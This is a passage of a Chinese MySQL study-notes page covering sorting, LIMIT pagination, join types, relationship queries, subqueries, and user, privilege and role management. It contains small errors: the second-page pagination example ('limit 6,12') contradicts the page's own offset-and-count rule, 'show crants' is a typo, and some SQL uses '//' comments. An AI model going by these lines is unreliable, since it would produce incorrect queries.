src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410150044456.png"></p></li><li><p><strong>查询2</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410150052131.png"></p></li><li><p><strong>聚合</strong><br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410150102998.png"></p></li></ol><hr><h5 id="4-5-4-排序查询"><a href="#4-5-4-排序查询" class="headerlink" title="4.5.4. 排序查询"></a>4.5.4. 排序查询</h5><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 1. 根据年龄，对员工进行升序排序</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age;<br><br><br><span class="hljs-meta"># 2. 根据入职时间，对员工进行降序排序</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> entrydate <span class="hljs-keyword">desc</span>;<br><br><br><span class="hljs-meta"># 3. 根据年龄对员工进行升序排序，若年龄相同，再按照入职时间进行降序排序</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">asc</span>,entrydate <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">排序方式</font>：<ul><li><font color="#7030a0">ASC（默认）</font>：升序</li><li><font color="#7030a0">DESC</font>：降序</li></ul></li><li>若有多个字段，先按第一个字段排序；若第一个字段中存在相同值，则在这些相同值的数据行中，按第二个字段继续排序。</li></ol></blockquote><hr><h5 id="4-5-5-分页查询"><a href="#4-5-5-分页查询" class="headerlink" title="4.5.5. 分页查询"></a>4.5.5. 分页查询</h5><p>表的记录可能会有几百万到上亿条记录，显示所有数据是不现实和低效率的，所以我们通常会在网站中进行分页，每页的数据就是根据分页查询做到的</p><p>计算方法：设起始行数为 n ，行数为 m ，从 n + 1 开始显示数据的，共显示 m 行数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"># 1. 若每页 6 条记录，查询第一页数据<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">6</span>;<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">limit</span> <span class="hljs-number">6</span>;<br><br># 2. 若每页 6 条记录，查询第二页数据<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">limit</span> <span class="hljs-number">6</span>,<span class="hljs-number">12</span>;<br><br># 3. 若每页 6 条记录，查询第三页数据<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> emp <span class="hljs-keyword">limit</span> <span class="hljs-number">12</span>,<span class="hljs-number">6</span>;<br></code></pre></td></tr></table></figure><hr><h5 id="4-5-6-多表联查"><a href="#4-5-6-多表联查" class="headerlink" title="4.5.6. 多表联查"></a>4.5.6. 多表联查</h5><h6 id="4-5-6-1-多表联查和外键约束的关系"><a href="#4-5-6-1-多表联查和外键约束的关系" class="headerlink" title="4.5.6.1. 多表联查和外键约束的关系"></a>4.5.6.1. 多表联查和外键约束的关系</h6><p>多表联查和外键约束本身并没有直接关系。外键约束主要用于保证数据的完整性，而不会直接影响联查的执行。</p><p>然而，进行多表联查时，通常是基于外键字段进行匹配查询的。例如，表 A 的 <code>dept_id</code> 外键与表 B 的 <code>dept_id</code> 进行关联，我们一般通过 <code>a.dept_id = b.dept_id</code> 来匹配数据。</p><hr><h6 id="4-5-6-2-笛卡尔积问题"><a href="#4-5-6-2-笛卡尔积问题" class="headerlink" title="4.5.6.2. 笛卡尔积问题"></a>4.5.6.2. 笛卡尔积问题</h6><p>执行多表查询时，若直接使用 <code>select * from emp,dept;</code> 执行结果有笛卡尔积问题：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410161532467.png"></p><p>在 SQL 语句中，如何去除无效的笛卡尔积？给多表查询加上连接查询的条件即可 <code>select * from emp,dept where emp.dept_id = dept.id;</code> 执行结果如下：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410161552865.png"></p><hr><h6 id="4-5-6-3-数据准备"><a href="#4-5-6-3-数据准备" class="headerlink" title="4.5.6.3. 数据准备"></a>4.5.6.3. 数据准备</h6><p>假设我们有 <code>employees</code>（员工表）和 <code>departments</code>（部门表）：</p><p>&#x3D;&#x3D;1.employess 表&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410165218847.png"></p><p>&#x3D;&#x3D;2.departments 表&#x3D;&#x3D;<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410162851472.png"></p><hr><h6 id="4-5-6-4-内连接"><a href="#4-5-6-4-内连接" class="headerlink" title="4.5.6.4. 内连接"></a>4.5.6.4. 内连接</h6><p>内连接是最常用的连接方式。当连接条件（如 <code>e.department_id = d.department_id</code>）满足时，它会返回两个表中所有符合条件的行及其所有列（满足才返回，不满足不返回）。之后，我们可以对结果应用 <code>SELECT</code> 和 <code>HAVING</code> 进行进一步筛选，最终得到查询结果。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <br>    <span class="hljs-built_in">e</span>.first_name, <br>    <span class="hljs-built_in">e</span>.last_name, <br>    <span class="hljs-built_in">e</span>.salary, <br>    d.department_name,<br>    d.location<br><span class="hljs-keyword">from</span> <br>    employees <span class="hljs-keyword">as</span> <span class="hljs-built_in">e</span><br><span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> <br>    departments <span class="hljs-keyword">as</span> d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.department_id = d.department_id;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410165304264.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>根据 SQL 执行顺序，先执行 <code>FROM</code>，再执行 <code>JOIN</code>，因此在 <code>FROM</code> 和 <code>INNER JOIN</code> 中为表指定的别名，可以在整个查询中使用。</li><li>切操作需遵循 SQL 执行顺序。在为表起别名之前，我们可以直接使用表名；但一旦为表指定了别名，之后必须使用别名，不能再使用原表名。</li></ol></blockquote><hr><h6 id="4-5-6-5-左连接"><a href="#4-5-6-5-左连接" class="headerlink" title="4.5.6.5. 左连接"></a>4.5.6.5. 左连接</h6><p>左连接会返回左表的所有行和所有列，无论连接条件是否满足。当连接条件（如 <code>e.department_id = d.department_id</code>）满足时，右表会返回匹配的行及其所有列；如果连接条件不满足（如 <code>e.department_id != d.department_id</code>），右表的列则会返回 <code>NULL</code>。之后，我们可以对结果应用 <code>SELECT</code> 和 <code>HAVING</code> 进行进一步筛选，最终得到查询结果。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <br>    <span class="hljs-built_in">e</span>.first_name, <br>    <span class="hljs-built_in">e</span>.last_name, <br>    <span class="hljs-built_in">e</span>.salary, <br>    d.department_name<br><span class="hljs-keyword">from</span> <br>    employees <span class="hljs-built_in">e</span><br><span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span> <br>    departments d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.department_id = d.department_id;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410165415783.png"></p><hr><h6 id="4-5-6-6-右连接"><a href="#4-5-6-6-右连接" class="headerlink" title="4.5.6.6. 右连接"></a>4.5.6.6. 右连接</h6><p>和左连接类似，只不过是右表提供所有数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <br>    <span class="hljs-built_in">e</span>.first_name, <br>    <span class="hljs-built_in">e</span>.last_name, <br>    <span class="hljs-built_in">e</span>.salary, <br>    d.department_name<br><span class="hljs-keyword">from</span> <br>    employees <span class="hljs-built_in">e</span><br><span class="hljs-keyword">right</span> <span class="hljs-keyword">join</span> <br>    departments d <span class="hljs-keyword">on</span> <span class="hljs-built_in">e</span>.department_id = d.department_id;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250410165544009.png"></p><hr><h6 id="4-5-6-7-自连接"><a href="#4-5-6-7-自连接" class="headerlink" title="4.5.6.7. 自连接"></a>4.5.6.7. 自连接</h6><p>自连接是将同一表与自身进行连接，常用于需要比较同一表中不同记录的情况。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> a.column1, b.column1<br><span class="hljs-keyword">FROM</span> table_a a<br><span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> table_a b <span class="hljs-keyword">ON</span> a.common_column = b.common_column<br><span class="hljs-keyword">WHERE</span> a.id != b.id;  <span class="hljs-comment">-- 防止自身匹配</span><br></code></pre></td></tr></table></figure><hr><h6 id="一对一查询"><a href="#一对一查询" class="headerlink" title="一对一查询"></a>一对一查询</h6><p>我们上面讲的内连接、左连接、右连接都很适合进行一对一查询。以 <code>Employee</code> 表和 <code>WorkCard</code> 表为例，<code>Employee</code> 表中的每个员工都有一个唯一的 <code>EmpID</code>，而 <code>WorkCard</code> 表中的每个工作证都对应一个唯一的员工。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Employee 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employee (<br>    EmpID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> WorkCard 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> WorkCard (<br>    CardID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    EmpID <span class="hljs-type">INT</span>, // 从表的外键字段 -&gt; 主表的字段（一般命名相同）<br>    IssueDate <span class="hljs-type">DATE</span>,<br>    <span class="hljs-keyword">FOREIGN KEY</span> (EmpID) <span class="hljs-keyword">REFERENCES</span> Employee(EmpID)<br>);<br><br><br># <span class="hljs-number">3.</span> 一对一查询（以内连接为例）<br><span class="hljs-keyword">SELECT</span> <br>  e.EmpID,<br>  e.Name,<br>  w.CardID,<br>  w.IssueDate<br><span class="hljs-keyword">FROM</span> <br>  WorkCard w<br><span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> <br>  Employee e // <span class="hljs-keyword">FROM</span> 从 <span class="hljs-keyword">JOIN</span> 主<br><span class="hljs-keyword">ON</span> <br>  e.EmpID = w.EmpID;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521211043750.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521211108505.png"></p><hr><h6 id="一对多查询"><a href="#一对多查询" class="headerlink" title="一对多查询"></a>一对多查询</h6><p>我们上面讲的内连接、左连接、右连接同样也都很适合进行一对多查询。假设有 <code>Department</code>（部门表）和 <code>Employee</code>（员工表）。一个部门有多个员工，每个员工属于一个部门。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Department 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Department (<br>    DeptID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    DeptName <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> Employee 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Employee (<br>    EmpID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),<br>    DeptID <span class="hljs-type">INT</span>, // 从表的外键字段 -&gt; 主表的字段（一般命名相同）<br>    <span class="hljs-keyword">FOREIGN KEY</span> (DeptID) <span class="hljs-keyword">REFERENCES</span> Department(DeptID)<br>);<br><br><br># <span class="hljs-number">3.</span> 一对多查询（以内连接为例）<br><span class="hljs-keyword">SELECT</span> <br>  e.EmpID,<br>  e.Name,<br>  d.DeptName<br><span class="hljs-keyword">FROM</span> <br>  Employee e<br><span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> <br>  Department d<br><span class="hljs-keyword">ON</span> <br>  e.DeptID = d.DeptID;<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521212132677.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250521212154361.png"></p><hr><h6 id="多对多查询"><a href="#多对多查询" class="headerlink" title="多对多查询"></a>多对多查询</h6><p>多对多查询的关键在于：查中间表，并对左右两侧的主表各做一次连接。假设有 <code>Student</code>（学生表）和 <code>Course</code>（课程表），一个学生可以选修多门课程，而每门课程可以有多个学生选修。我们需要一个中间表 <code>Enrollment</code> 来记录学生与课程之间的关系。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> Student 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Student (<br>    StudentID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    <span class="hljs-type">Name</span> <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">2.</span> Course 表（主表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Course (<br>    CourseID <span class="hljs-type">INT</span> <span class="hljs-keyword">PRIMARY KEY</span>,<br>    CourseName <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>)<br>);<br><br><br># <span class="hljs-number">3.</span> Enrollment 表（从表）<br><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> Enrollment (<br>    StudentID <span class="hljs-type">INT</span>,<br>    CourseID <span class="hljs-type">INT</span>,<br>    <span class="hljs-keyword">PRIMARY KEY</span> (StudentID, CourseID),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (StudentID) <span class="hljs-keyword">REFERENCES</span> Student(StudentID),<br>    <span class="hljs-keyword">FOREIGN KEY</span> (CourseID) <span class="hljs-keyword">REFERENCES</span> Course(CourseID)<br>);<br><br><br># <span class="hljs-number">4.</span> 多对多查询<br><span class="hljs-keyword">SELECT</span><br>  s.Name <span class="hljs-keyword">AS</span> 学生名,<br>  c.CourseName <span class="hljs-keyword">AS</span> 课程名<br><span class="hljs-keyword">FROM</span><br>  Enrollment e // 中间表<br><span class="hljs-keyword">JOIN</span><br>  Student s <span class="hljs-keyword">ON</span> e.StudentID = s.StudentID // 第一次 <span class="hljs-keyword">JOIN</span>：连接学生<br><span class="hljs-keyword">JOIN</span><br>  Course c <span class="hljs-keyword">ON</span> e.CourseID = c.CourseID // 第二次 <span class="hljs-keyword">JOIN</span>：连接课程<br></code></pre></td></tr></table></figure><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250522101521175.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250522101539693.png"></p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9AMySQL%20%E5%9F%BA%E7%A1%80/image-20250522101559348.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>我们平时常见的是两个实体之间的多对多关系，但其实三个甚至更多实体之间也能形成多对多关系，也是一个中间表。查询的时候，只要用中间表，多次连接相关表，就能把信息都查出来。</li></ol></blockquote><hr><h5 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h5><p>子查询可以出现在 SQL 的三个位置。现在你只需要先记住最常见的一种用法：写在 <code>WHERE</code> 后面，用于筛选数据。</p><table><thead><tr><th>放置位置</th><th>示例</th><th>作用</th></tr></thead><tbody><tr><td><code>WHERE</code> 后</td><td><code>WHERE id IN (SELECT id FROM ...)</code></td><td>筛选数据</td></tr><tr><td><code>SELECT</code> 中</td><td><code>SELECT (SELECT AVG(score) ...) AS avg_score</code></td><td>字段值计算</td></tr><tr><td><code>FROM</code> 中</td><td><code>FROM (SELECT ...) AS temp</code></td><td>临时表、组合逻辑</td></tr></tbody></table><p>当你看到以下几种场景时，通常意味着可能要用到子查询了：</p><ol><li>&#x3D;&#x3D;存在性判断&#x3D;&#x3D;：<ol><li>关键词：<ol><li>存在、不存在、是否在，</li><li>简单来说，就是在问 “<strong>有没有？</strong>”</li></ol></li><li>例如示例：<ol><li>哪些项目没有使用红色零件？</li><li>找出未使用红色零件的项目</li></ol></li><li>注意事项：<ol><li>如果是“有”的情况（如：某些项目使用了红色零件），通常 直连 即可。</li><li>如果是“没有”的情况（如：哪些项目没有使用红色零件），大概率需要用 子查询 来排除。</li></ol></li></ol></li><li>&#x3D;&#x3D;极值查询&#x3D;&#x3D;：<ol><li>关键词：<ol><li>最大、最小、前几名</li></ol></li></ol></li><li>&#x3D;&#x3D;集合比较&#x3D;&#x3D;：<ol><li>关键词：<ol><li>全部、至少、包含</li></ol></li></ol></li><li>&#x3D;&#x3D;字段间的比较用到全表的动态值&#x3D;&#x3D;：</li></ol><hr><h4 id="4-6-DCL（用户、角色管理）"><a href="#4-6-DCL（用户、角色管理）" class="headerlink" title="4.6. DCL（用户、角色管理）"></a>4.6. DCL（用户、角色管理）</h4><h5 id="4-6-1-用户管理"><a href="#4-6-1-用户管理" class="headerlink" title="4.6.1. 用户管理"></a>4.6.1. 用户管理</h5><p>&#x3D;&#x3D;1.创建用户&#x3D;&#x3D;</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">create user <span class="hljs-string">&#x27;&lt;用户名&gt;&#x27;</span>@<span class="hljs-string">&#x27;&lt;主机地址&gt;&#x27;</span> identified <span class="hljs-meta">by</span> <span class="hljs-string">&#x27;密码&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 主机地址：</span><br><span class="hljs-string">1. 主机地址可以为 %，允许该用户从任何主机连接到 MySQL 数据库</span><br><span class="hljs-string">2. 例如：&#x27;user&#x27;@&#x27;%&#x27;，表示无论什么 IP，只要你是 user 用户，就都能连接到数据库</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除用户&#x3D;&#x3D;</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机地址&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.更新用户&#x3D;&#x3D;</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># <span class="hljs-number">1.</span> 修改用户密码<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机地址&#x27;</span> identified <span class="hljs-keyword">with</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;新密码&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.查询用户&#x3D;&#x3D;</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 1. 查询有哪些用户</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.user;<br><br><br><span class="hljs-meta"># 2. 查询用户的权限</span><br>show crants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;用户名&#x27;</span>@<span class="hljs-string">&#x27;主机地址&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;5.授予用户权限&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. 授予用户权限</span><br>grant &lt;权限列表,&gt; on &lt;数据库名&gt;.&lt;表名&gt; to <span class="hljs-string">&#x27;&lt;用户名&gt;&#x27;</span>@<span class="hljs-string">&#x27;&lt;主机名&gt;&#x27;</span> [<span class="hljs-keyword">with</span> grant option];<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">1. 注意事项：</span><br><span class="hljs-string">1. 一个语句一个 &lt;数据库名&gt;.&lt;表名&gt;，如果你非要同时授权多个表，那就得多写几条语句</span><br><span class="hljs-string">2. 但是我们可以使用 * 表示所有数据库或所有表</span><br><span class="hljs-string">2. 常用权限：</span><br><span class="hljs-string">3. with grant option：</span><br><span class="hljs-string">1. 用户可以把自己的权限再授权给别的用户</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-comment"># 2. 刷新权限，使其生效</span><br>FLUSH PRIVILEGES;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项：常用权限</p><ol><li><font color="#00b0f0">ALL PRIVILEGES</font>：授予所有权限</li><li><font color="#00b0f0">ALTER</font>：修改数据库、表的结构</li><li><font color="#00b0f0">ALTER ROUTINE</font>：修改存储过程或函数</li><li><font color="#00b0f0">CREATE</font>：创建数据库、表等对象</li><li><font color="#00b0f0">CREATE ROUTINE</font>：创建存储过程或函数</li><li><font color="#00b0f0">CREATE TEMPORARY TABLES</font>：创建临时表</li><li><font color="#00b0f0">CREATE VIEW</font>：创建视图</li><li><font color="#00b0f0">DELETE</font>：删除数据</li><li><font color="#00b0f0">DROP</font>：删除数据库、表、视图等对象</li><li><font color="#00b0f0">EVENT</font>：管理事件调度</li><li><font color="#00b0f0">EXECUTE</font>：执行存储过程或函数</li><li><font color="#00b0f0">GRANT OPTION</font>：授予权限</li><li><font color="#00b0f0">INDEX</font>：创建和删除索引</li><li><font color="#00b0f0">INSERT</font>：插入数据</li><li><font color="#00b0f0">LOCK TABLES</font>：锁定表</li><li><font color="#00b0f0">REFERENCES</font>：管理外键约束</li><li><font color="#00b0f0">SELECT</font>：查询数据</li><li><font color="#00b0f0">SHOW VIEW</font>：查看视图的定义</li><li><font color="#00b0f0">TRIGGER</font>：创建和删除触发器</li><li><font color="#00b0f0">UPDATE</font>：更新数据</li><li><font color="#00b0f0">FILE</font>：读取文件</li><li><font color="#00b0f0">REPLICATION CLIENT</font>：管理复制客户端，允许查看复制状态</li><li><font color="#00b0f0">REPLICATION SLAVE</font>：允许从服务器连接到主服务器进行复制</li><li>权限的授予通常基于数据库、表或列的范围。例如，如果你拥有 <font color="#00b0f0">CREATE</font> 权限并且授予到<code>*.*</code>，那么你可以创建数据库和表；但如果权限只授予到 <code>my_repository.*</code>，你只能创建该库下的表，不能创建数据库；如果是 <code>my_repository.my_table</code>，你连表都无法创建。</li></ol></blockquote><p>&#x3D;&#x3D;6.撤销用户权限&#x3D;&#x3D;</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pf">revoke <span class="hljs-variable">&lt;权限列表,&gt;</span> <span class="hljs-keyword">on</span> <span class="hljs-variable">&lt;数据库名&gt;</span>.<span class="hljs-variable">&lt;表名&gt;</span> <span class="hljs-keyword">from</span> &#x27;<span class="hljs-variable">&lt;用户名&gt;</span>&#x27;@&#x27;<span class="hljs-variable">&lt;主机名&gt;</span>&#x27;;<br></code></pre></td></tr></table></figure><hr><h5 id="4-6-2-角色管理"><a href="#4-6-2-角色管理" class="headerlink" title="4.6.2. 角色管理"></a>4.6.2. 角色管理</h5><p>&#x3D;&#x3D;1.创建角色&#x3D;&#x3D;</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">ROLE</span> <span class="hljs-string">&#x27;角色名&#x27;</span>;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;2.删除角色&#x3D;&#x3D;</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">role</span> <span 